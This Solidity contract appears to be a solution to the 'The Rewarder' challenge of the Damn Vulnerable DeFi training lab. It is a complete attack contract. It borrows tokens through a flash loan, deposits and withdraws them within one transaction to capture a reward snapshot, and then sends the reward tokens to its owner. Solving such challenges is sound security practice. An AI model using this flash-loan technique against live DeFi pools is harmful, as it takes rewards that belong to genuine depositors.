// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/"

contract TheRewarderPoolAttacker is Ownable {
    using Address for address;
    // using SafeMath for uint256;

    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    TheRewarderPool public immutable pool;
    // address public theRewarderPoolAddress;

    constructor(address _liquidityTokenAddress, address _rewardTokenAddress, address _theRewarderPoolAddress) {
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        // theRewarderPoolAddress = _theRewarderPoolAddress;
        rewardToken = RewardToken(_rewardTokenAddress);
        pool = TheRewarderPool(_theRewarderPoolAddress);
    }

    function attackPool(address flashLoanerPool, uint256 amount) public onlyOwner {
        // flash loan 
        flashLoanerPool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                amount
            )
        );
    }

    function getFreeRewards() public onlyOwner {
        pool.distributeRewards();

        uint256 amount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner(), amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(liquidityToken.balanceOf(address(this)) == amount, "token isn't transfered yet");

        liquidityToken.approve(address(pool), amount);

        // deposit 
        pool.deposit(amount);

        // withdraw 
        pool.withdraw(amount);

        // pay back 
        liquidityToken.transfer(msg.sender, amount);
    }
}   